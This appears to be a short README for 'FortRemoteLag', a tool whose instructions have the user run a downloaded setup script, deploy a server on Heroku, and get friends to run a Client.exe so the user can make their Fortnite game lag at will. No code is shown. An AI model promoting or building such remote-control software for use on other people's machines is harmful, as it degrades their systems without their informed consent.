# FortRemoteLag

Download [this](https://gist.github.com/arianaglande/c9ac0a8a92d9385b9cb96188aa566fec) script. It will automatically clone both server and client repos, compile the client and deploy the server on heroku.

Dont worry about heroku, it will redirect you to the auth page, there you will be able to either create an account or login to an existing one.

At the end you'll just need the link that gets printed at the end of the script's execution, and the Client.exe.

Make you friends run the Client.exe and you'll be able to make them lag whenever you want on Fortnite!
